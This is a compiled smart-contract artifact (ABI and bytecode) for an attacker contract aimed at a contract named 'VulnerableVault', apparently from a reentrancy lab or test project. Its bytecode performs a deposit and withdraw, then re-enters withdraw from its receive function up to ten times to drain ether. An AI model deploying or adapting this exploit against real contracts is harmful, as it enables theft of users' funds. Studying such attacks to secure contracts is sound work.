{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b50604051610696380380610696833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61058a8061010c5f395ff3fe608060405260043610610042575f3560e01c806312065fe014610149578063407c2821146101735780639e5faafc1461019d578063fbfa77cf146101a757610145565b3661014557670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100985750600a600154105b156101435760015f8154809291906100af90610388565b91905055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016101159190610411565b5f604051808303815f87803b15801561012c575f5ffd5b505af115801561013e573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610154575f5ffd5b5061015d6101d1565b60405161016a9190610439565b60405180910390f35b34801561017e575f5ffd5b506101876101d8565b6040516101949190610439565b60405180910390f35b6101a56101de565b005b3480156101b2575f5ffd5b506101bb61032e565b6040516101c891906104c3565b60405180910390f35b5f47905090565b60015481565b670de0b6b3a7640000341015610229576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161022090610536565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b15801561028f575f5ffd5b505af11580156102a1573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016102ff9190610439565b5f604051808303815f87803b158015610316575f5ffd5b505af1158015610328573d5f5f3e3d5ffd5b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6103928261037f565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103c4576103c3610352565b5b600182019050919050565b5f819050919050565b5f819050919050565b5f6103fb6103f66103f1846103cf565b6103d8565b61037f565b9050919050565b61040b816103e1565b82525050565b5f6020820190506104245f830184610402565b92915050565b6104338161037f565b82525050565b5f60208201905061044c5f83018461042a565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61048b61048661048184610452565b6103d8565b610452565b9050919050565b5f61049c82610471565b9050919050565b5f6104ad82610492565b9050919050565b6104bd816104a3565b82525050565b5f6020820190506104d65f8301846104b4565b92915050565b5f82825260208201905092915050565b7f4e656564203120455448000000000000000000000000000000000000000000005f82015250565b5f610520600a836104dc565b915061052b826104ec565b602082019050919050565b5f6020820190508181035f83015261054d81610514565b905091905056fea2646970667358221220d2a99ce6f40f7706dd3a8812feda8beb4c069b893e02c2d5de3afad624e5fd3164736f6c63430008210033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attackCount()":"407c2821","getBalance()":"12065fe0","vault()":"fbfa77cf"},"id":0}